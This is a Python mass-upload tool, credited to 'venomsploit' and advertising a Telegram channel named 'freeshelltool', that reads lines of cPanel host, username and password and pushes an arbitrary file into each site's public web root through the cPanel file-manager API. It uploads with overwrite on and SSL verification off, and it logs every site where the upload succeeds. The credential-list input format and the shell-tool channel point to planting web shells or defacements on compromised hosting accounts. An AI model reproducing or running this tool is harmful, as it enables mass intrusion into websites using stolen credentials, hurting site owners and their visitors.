#utf-8
# Coded by venomsploit
#

import os
import asyncio
from colorama import Fore, Style
from platform import system
from urllib.parse import urlparse

# color
green = Fore.GREEN
red = Fore.RED
ra = Style.RESET_ALL

try:
    import aiohttp
except ImportError:
    print("Please install aiohttp [!]\n\t pip install aiohttp")


class FileUploader:
    __slots__ = ('cpanel_info_file', 'file_path')

    def __init__(self, cpanel_info_file, file_path):
        self.cpanel_info_file = cpanel_info_file
        self.file_path = file_path

    async def read_cpanel_info(self, line):
        values = [v.strip() for v in line.split('|')]

        if len(values) >= 3:
            site, user, password = values[:3]
            return site, user, password
        else:
            raise ValueError("Invalid format")

    async def cp_to_upload_file(self, cPanel_user, cPanel_pass, cPanel_host):
        api_url = f"{cPanel_host}/execute/Fileman/upload_files"
        auth = aiohttp.BasicAuth(login=cPanel_user, password=cPanel_pass)

        with open(self.file_path, 'rb') as file:
            data = aiohttp.FormData()
            data.add_field('file', file, filename=self.file_path, content_type='text/plain')
            data.add_field('dir', "/public_html")
            data.add_field('overwrite', '1')

            async with aiohttp.ClientSession() as session:
                async with session.post(api_url, auth=auth, data=data, timeout=15, ssl=False) as response:
                    await self.handle_response(response, cPanel_host)

    async def process_cpanel_entry(self, cpanel_info_entry):
        try:
            site, cPanel_user, cPanel_pass = await self.read_cpanel_info(cpanel_info_entry)
            cPanel_host = site

            await self.cp_to_upload_file(cPanel_user, cPanel_pass, cPanel_host)
        except Exception as e:
            print(f"Error processing cPanel information: {e}")

    async def handle_response(self, response, cPanel_host):
        site = urlparse(cPanel_host).hostname
        if response.status == 200:
            content_type = response.headers.get('Content-Type', '')
            if 'application/json' in content_type:
                response_data = await response.json()
                print("Full Response Data:", response_data)
            else:
                response_text = await response.text()
                if '"succeeded":1' in response_text:
                    print(f"{green}[+]{ra} https://{site}/{self.file_path} => {green}File upload succeeded!{ra}")
                    with open('success.txt', 'a') as success_output:
                        success_output.write(f"https://{site}/{self.file_path} \n")
                else:
                    print(f"{red}[-]{ra} https://{site} => {red}File upload failed.{ra}")
        else:
            print(f"{red}[-]{ra} https://{site} => {red}File upload failed.{ra}")

    async def main(self):
        tasks = []
        with open(self.cpanel_info_file, encoding='utf-8', mode='r') as cpanel_file:
            for line in cpanel_file:
                tasks.append(self.process_cpanel_entry(line))
        await asyncio.gather(*tasks)


def clear():
    if system() == 'Linux':
        os.system('clear')
    if system() == 'Windows':
        os.system('cls')


def banner() -> None:
    print(f"""\t
\t
\t
\t
\t                             UPLOAD ANYTHING INTO CPANEL 
\t
\t
\t
\t                                         v0.1                                      
""")
    print(f"""\tMass cPanel To Upload Anything  by {green}VENOMSPLOIT{ra}
    \n\t {green}Author:t.me/@v3t4l1 {ra} Our Channel :t.me/@freeshelltool
    \t   {green}File Format{ra} : https://site:2083|user|pass \t\n\t\t\t http://site:2082|user|pass
""")


if __name__ == "__main__":
    clear()
    banner()
    cpanel_info_file = input("Enter the name of the cPanel file: ")
    file_path = input("Enter the name of the file to upload: ")
    uploader = FileUploader(cpanel_info_file, file_path)
    asyncio.run(uploader.main())
